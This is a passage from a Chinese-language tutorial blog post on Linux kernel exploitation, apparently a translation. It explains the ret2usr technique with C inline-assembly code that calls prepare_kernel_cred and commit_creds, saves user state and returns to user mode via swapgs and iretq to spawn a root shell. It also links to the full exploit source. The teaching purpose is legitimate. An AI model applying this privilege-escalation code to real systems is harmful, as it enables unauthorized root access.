<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
        <span class="p">...</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><blockquote>
<p>注意我写代码使用了一种非常干净的方式，在C代码中使用英特尔语法编写内联汇编。</p>
</blockquote>
<h5 id="返回用户级">返回用户级</h5>
<p>在当前状态下，如果你只是返回用户级代码来弹出shell，那么你会失望的。原因是在运行上述代码之后，我们仍然在内核模式下执行。为了打开根shell，我们必须返回用户模式。
基本上，如果内核正常运行，它将使用以下指令中的一条返回用户级：<code>sysretq</code>或<code>iretq</code>（x86_64）。大多数人用<code>iretq</code>，据我所知这是因为<code>sysretq</code>使用更复杂。<code>iretq</code>指令只需要用5个用户级寄存器值按以下顺序设置栈：<code>RIP|CS|RFLAGS|SP|SS</code>。
进程为这些寄存器跟踪两组不同的值，一组用于用户模式，另一组用于内核模式。因此，在内核模式下完成执行后，它必须恢复到这些寄存器的用户模式值。我们可以简单地设置<code>RIP</code>为弹出shell的函数的地址。如果我们随机设置其他寄存器，进程可能不会继续按预期执行。为了解决这个问题，人们想到了一个非常聪明的方法：在进入内核模式之前保存这些寄存器的状态，在获得根权限后重新加载它们。保存状态的函数如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;mov user_cs, cs;&#34;</span>
        <span class="s">&#34;mov user_ss, ss;&#34;</span>
        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
        <span class="s">&#34;pushf;&#34;</span>
        <span class="s">&#34;pop user_rflags;&#34;</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>还有一件事，x86_64上还有一个叫做<code>swapgs</code>的指令必须在<code>iretq</code>之前被调用。这条指令的目的是在内核模式和用户模式之间交换<code>GS</code>寄存器。有了所有这些信息，我们可以完成获得root权限的代码，之后返回用户模式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
        <span class="s">&#34;swapgs;&#34;</span>
        <span class="s">&#34;mov r15, user_ss;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_sp;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_cs;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_rip;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;iretq;&#34;</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>最终，我们可以以指定顺序调用精心设计的代码片段，打开根shell：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">save_state</span><span class="p">();</span>
    <span class="n">open_dev</span><span class="p">();</span>
    <span class="n">leak</span><span class="p">();</span>
    <span class="n">overflow</span><span class="p">();</span>  
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><h4 id="总结">总结</h4>
<p>以上就是我关于Linux内核利用学习过程的第一篇文章。在这篇文章中，我演示了如何为Linux内核pwn设置环境，以及内核利用中最简单的技术：<code>ret2usr</code>。
在下一篇文章中，我将通过添加越来越多的保护功能来逐渐增加难度，并向您展示相应的绕过技术。</p>
<h4 id="附录">附录</h4>
<p>提取内核映像的脚本为<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh" target="_blank" rel="noopener noreffer ">extract-image.sh</a>。
解压文件系统的脚本为<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/decompress.sh" target="_blank" rel="noopener noreffer ">decompress.sh</a>。
编译利用和压缩文件系统的脚本为<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/compress.sh" target="_blank" rel="noopener noreffer ">compress.sh</a>。
完整的<code>ret2usr</code>利用代码是<a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ret2usr.c" target="_blank" rel="noopener noreffer ">ret2usr.c</a>。</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2023-02-05</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" data-title="Linux内核利用 part 3" data-hashtags="内核利用"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" data-hashtag="内核利用"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" data-title="Linux内核利用 part 3"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" data-title="Linux内核利用 part 3"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" data-title="Linux内核利用 part 3"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="../../../tags/%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/">内核利用</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="../../../">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="../../../posts/7-%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/" class="prev" rel="prev" title="安全书籍"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>安全书籍</a>
            <a href="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-2-%E5%89%AF%E6%9C%AC/" class="next" rel="next" title="Linux内核利用 part 2">Linux内核利用 part 2<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="../../../" target="_blank">admin</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="../../../js/theme.min.js"></script></body>
</html>
